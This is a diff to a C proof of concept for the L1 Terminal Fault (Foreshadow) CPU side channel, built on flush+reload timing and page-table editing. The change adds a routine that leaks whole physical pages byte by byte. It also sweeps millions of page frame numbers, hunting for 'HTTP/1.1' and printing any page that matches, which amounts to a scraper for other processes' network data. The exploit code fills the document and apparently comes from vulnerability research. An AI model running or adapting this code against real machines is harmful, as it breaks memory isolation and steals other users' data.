@@ -3,9 +3,11 @@
 #include "flush_and_reload.h"
 #include "statistics.h"
 #include <bits/types/siginfo_t.h>
+#include <ctype.h>
 #include <signal.h>
 #include <stdint.h>
 #include <stdlib.h>
+#include <string.h>
 #include <sys/mman.h>
 #include <ucontext.h>
 #include <unistd.h>
@@ -18,6 +20,8 @@
 #include <assert.h>
 
 extern uint64_t reload_label(void);
+
+#define THRESHOLD 150
 
 #define REG_RIP 16
 #pragma GCC diagnostic push
@@ -44,7 +48,7 @@ static void segfault_handler(int sig, siginfo_t *info, void *ucontext) {
 typedef uint8_t reload_buffer_t[AMOUNT_OF_NIBBLES_PER_RELOAD]
                                [AMOUNT_OF_OPTIONS_IN_NIBBLE][PAGE_SIZE];
 
-uint8_t l1tf(void *leak_addr, reload_buffer_t reload_buffer, size_t threshold) {
+uint8_t l1tf(void *leak_addr, reload_buffer_t reload_buffer) {
   size_t raw_results[AMOUNT_OF_RELOAD_PAGES] = {0};
 
   flush(AMOUNT_OF_RELOAD_PAGES, PAGE_SIZE, (void *)reload_buffer);
@@ -76,7 +80,7 @@ uint8_t l1tf(void *leak_addr, reload_buffer_t reload_buffer, size_t threshold) {
                : "rax", "rbx");
 
   reload(AMOUNT_OF_RELOAD_PAGES, PAGE_SIZE, (void *)reload_buffer, raw_results,
-         threshold);
+         THRESHOLD);
 
   // Reconstruct
   uint8_t result = 0;
@@ -88,6 +92,18 @@ uint8_t l1tf(void *leak_addr, reload_buffer_t reload_buffer, size_t threshold) {
   }
 
   return result;
+}
+
+void leak_page(size_t pfn, void *leak, reload_buffer_t reload_buffer,
+               uint8_t data_out[PAGE_SIZE]) {
+  // Set the PFN of the leak page
+  ptedit_pte_set_pfn(leak, 0, pfn);
+
+  for (size_t j = 0; j < 0x100; j += 1) {
+    void *leak_addr = (char *)leak + j;
+    uint8_t leaked_byte = l1tf(leak_addr, reload_buffer);
+    data_out[j] = leaked_byte;
+  }
 }
 
 int main(int argc, char *argv[argc]) {
@@ -127,8 +143,6 @@ int main(int argc, char *argv[argc]) {
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
   assert(reload_buffer != MAP_FAILED);
 
-  size_t threshold = 150;
-
   // Modify the PFN
   fprintf(stderr, "Set leak PFN to requested 0x%lx\n", pfn);
   assert(!ptedit_init());
@@ -144,14 +158,30 @@ int main(int argc, char *argv[argc]) {
   fprintf(stderr, "Clear the reload buffer at %p\n", reload_buffer);
   memset(reload_buffer, 0, sizeof(reload_buffer_t));
 
-  printf("Results physcial addr %lx:\n", phys_addr);
-  size_t start = (phys_addr & 0xfff);
-  for (size_t j = start; j < start + length; j += 1) {
-    void *leak_addr = (char *)leak + j;
-    uint8_t leaked_byte = l1tf(leak_addr, *reload_buffer, threshold);
-    printf("%x ", leaked_byte);
+  char needle[8] = "HTTP/1.1";
+  uint8_t page[PAGE_SIZE] = {0};
+
+  for (size_t p = 0; p < 0x1000000; ++p) {
+    printf("Looking at PFN %lx\r", p);
+    leak_page(p, leak, *reload_buffer, page);
+    char *ptr = memmem(page, PAGE_SIZE, needle, 8);
+    if (ptr != NULL) {
+      printf("Found on PFN %lx:\n", p);
+      for (int i = 0; i < PAGE_SIZE; ++i) {
+        printf("%c", page[i]);
+      }
+      printf("\n");
+    }
   }
-  printf("\n");
+
+  // printf("Results physcial addr %lx:\n", phys_addr);
+  // size_t start = (phys_addr & 0xfff);
+  // for (size_t j = start; j < start + length; j += 1) {
+  //   void *leak_addr = (char *)leak + j;
+  //   uint8_t leaked_byte = l1tf(leak_addr, *reload_buffer);
+  //   printf("%x ", leaked_byte);
+  // }
+  // printf("\n");
 
   // Restore the segfault handler back to normal
   sa.sa_handler = SIG_DFL;
